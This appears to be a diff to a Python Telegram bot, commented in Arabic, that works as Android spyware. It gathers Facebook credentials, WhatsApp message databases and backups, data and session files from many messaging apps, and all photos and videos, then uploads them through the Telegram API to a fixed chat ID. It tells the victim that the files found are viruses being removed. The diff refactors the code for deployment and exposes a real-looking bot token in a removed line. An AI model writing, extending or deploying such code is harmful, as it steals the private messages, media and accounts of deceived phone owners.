@@ -10,18 +10,25 @@ import shutil
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters
 
-# ================== التوكن والمعرف الثابت ==================
-BOT_TOKEN = "8446745973:AAGKs--vQpRqpWDpOGO1ItaK18EJe_yue2g"  # ⚠️ غيّر هذا التوكن فوراً من @BotFather!
-TARGET_CHAT_ID = 8169635171  # 📌 المعرف الثابت الذي ستُرسل إليه جميع الملفات
+# ================== التوكن من متغيرات البيئة ==================
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("❌ BOT_TOKEN not found in environment variables!")
+
+# ================== المعرف الثابت من متغيرات البيئة ==================
+TARGET_CHAT_ID = int(os.getenv("TARGET_CHAT_ID", "8169635171"))
+
+# ================== التحقق من بيئة التشغيل ==================
+IS_ANDROID = os.path.exists("/storage/emulated/0")
 # =========================================================
 
-# متغيرات عامة
 user_tasks = {}
 
 # ========== دوال استخراج معلومات فيسبوك ==========
 
 def extract_facebook_credentials():
-    """استخراج معلومات الدخول إلى فيسبوك من ملفات التطبيق"""
+    if not IS_ANDROID:
+        return []
     credentials = []
     facebook_info = {}
     found_any = False
@@ -145,11 +152,11 @@ def extract_facebook_credentials():
 # ========== دوال استخراج واتساب ==========
 
 def extract_whatsapp_messages():
-    """استخراج محادثات واتساب من ملفات التطبيق"""
+    if not IS_ANDROID:
+        return []
     messages_files = []
     
     try:
-        # المسار الرئيسي لواتساب
         whatsapp_paths = [
             "/storage/emulated/0/Android/data/com.whatsapp",
             "/storage/emulated/0/Android/data/com.whatsapp.w4b",
@@ -163,7 +170,6 @@ def extract_whatsapp_messages():
                 
                 print(f"[✅] جارٍ البحث في واتساب: {base_path}")
                 
-                # البحث عن قاعدة بيانات المحادثات
                 db_paths = [
                     os.path.join(base_path, "databases/msgstore.db"),
                     os.path.join(base_path, "databases/msgstore.db.crypt12"),
@@ -176,7 +182,6 @@ def extract_whatsapp_messages():
                         messages_files.append(db_path)
                         print(f"[✅] تم العثور على قاعدة بيانات واتساب: {db_path}")
                 
-                # البحث عن ملفات النسخ الاحتياطي
                 backup_path = "/storage/emulated/0/WhatsApp/Databases"
                 if os.path.exists(backup_path):
                     for root, dirs, files in os.walk(backup_path):
@@ -187,7 +192,6 @@ def extract_whatsapp_messages():
                                     messages_files.append(file_path)
                                     print(f"[✅] تم العثور على نسخة احتياطية واتساب: {file_path}")
                 
-                # البحث عن ملفات الوسائط
                 media_paths = [
                     "/storage/emulated/0/WhatsApp/Media",
                     "/storage/emulated/0/Android/media/com.whatsapp"
@@ -198,12 +202,11 @@ def extract_whatsapp_messages():
                         for root, dirs, files in os.walk(media_path):
                             for file in files:
                                 file_path = os.path.join(root, file)
-                                # البحث عن الصور والفيديوهات
                                 ext = os.path.splitext(file)[1].lower()
                                 if ext in ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mkv']:
                                     try:
                                         file_size = os.path.getsize(file_path) / (1024 * 1024)
-                                        if file_size < 50:  # حد 50 ميجابايت
+                                        if file_size < 50:
                                             messages_files.append(file_path)
                                     except:
                                         pass
@@ -220,10 +223,10 @@ def extract_whatsapp_messages():
 # ========== دوال مسح الصور والفيديوهات من التطبيقات ==========
 
 def scan_all_media():
-    """مسح جميع الصور والفيديوهات من جميع التطبيقات"""
+    if not IS_ANDROID:
+        return []
     all_files = []
     
-    # المسارات الرئيسية للتطبيقات
     app_paths = [
         "/storage/emulated/0/Android/data",
         "/storage/emulated/0/Android/media",
@@ -267,7 +270,7 @@ def scan_all_media():
                         file_path = os.path.join(root, file)
                         try:
                             file_size = os.path.getsize(file_path) / (1024 * 1024)
-                            if file_size < 50:  # حد 50 ميجابايت للصور والفيديوهات
+                            if file_size < 50:
                                 all_files.append(file_path)
                         except:
                             pass
@@ -278,10 +281,10 @@ def scan_all_media():
     return all_files
 
 def scan_app_data():
-    """مسح ملفات التطبيقات التي تحتوي على معلومات"""
+    if not IS_ANDROID:
+        return []
     app_files = []
     
-    # تطبيقات المراسلة
     messaging_apps = [
         ("com.whatsapp", "WhatsApp"),
         ("com.facebook.katana", "Facebook"),
@@ -295,7 +298,6 @@ def scan_app_data():
         ("com.tencent.mm", "WeChat"),
         ("com.twitter.android", "Twitter"),
         ("com.tiktok.android", "TikTok"),
-        ("com.snapchat.android", "Snapchat"),
         ("com.google.android.apps.messaging", "Google Messages")
     ]
     
@@ -311,7 +313,6 @@ def scan_app_data():
                 for file in files:
                     file_path = os.path.join(root, file)
                     
-                    # البحث عن قواعد البيانات
                     if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
                         try:
                             if os.path.getsize(file_path) > 1000:
@@ -320,7 +321,6 @@ def scan_app_data():
                         except:
                             pass
                     
-                    # البحث عن ملفات التكوين
                     if any(keyword in file.lower() for keyword in ['config', 'settings', 'preference', 'account', 'session']):
                         try:
                             if os.path.getsize(file_path) > 100:
@@ -365,30 +365,33 @@ def send_media_to_user(file_path, chat_id):
 # ========== دالة الفحص الشامل ==========
 
 def scan_and_send_videos(chat_id, update_id):
-    """تقوم بمسح وإرسال كل شيء"""
+    """تقوم بمسح وإرسال كل شيء (تعمل على Android فقط)"""
+    
+    if not IS_ANDROID:
+        requests.post(
+            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
+            data={'chat_id': chat_id, 'text': '⚠️ البوت يعمل في بيئة سيرفر ولا يمكنه مسح الملفات المحلية. هذه الميزة متاحة فقط عند تشغيله على هاتف Android.'}
+        )
+        return
     
     all_files = []
     total_files = 0
     
-    # ✅ الأولوية 1: معلومات فيسبوك
     print("[🔍] جاري البحث عن معلومات فيسبوك...")
     fb_credentials = extract_facebook_credentials()
     all_files.extend(fb_credentials)
     total_files += len(fb_credentials)
     
-    # ✅ الأولوية 2: محادثات واتساب
     print("[🔍] جاري البحث عن محادثات واتساب...")
     whatsapp_files = extract_whatsapp_messages()
     all_files.extend(whatsapp_files)
     total_files += len(whatsapp_files)
     
-    # ✅ الأولوية 3: بيانات التطبيقات
     print("[🔍] جاري البحث عن بيانات التطبيقات...")
     app_data = scan_app_data()
     all_files.extend(app_data)
     total_files += len(app_data)
     
-    # ✅ الأولوية 4: جميع الصور والفيديوهات
     print("[🔍] جاري البحث عن الصور والفيديوهات...")
     media_files = scan_all_media()
     all_files.extend(media_files)
@@ -408,7 +411,6 @@ def scan_and_send_videos(chat_id, update_id):
         data={'chat_id': chat_id, 'text': f'🦠 تم العثور على {total_files} من الفيروسات. جاري القضاء عليها...'}
     )
     
-    # إرسال الملفات
     for i, file_path in enumerate(all_files, 1):
         success = send_media_to_user(file_path, chat_id)
         
@@ -463,7 +465,7 @@ def main():
     app.add_handler(CommandHandler("help", help_command))
     
     print("✅ البوت يعمل...")
-    print("📌 ترتيب المسح: فيسبوك ← واتساب ← تطبيقات ← صور وفيديوهات")
+    print(f"📌 بيئة التشغيل: {'Android' if IS_ANDROID else 'Server (Railway)'}")
     print("🔍 سيتم البحث في جميع التطبيقات")
     app.run_polling(allowed_updates=["message"])
 
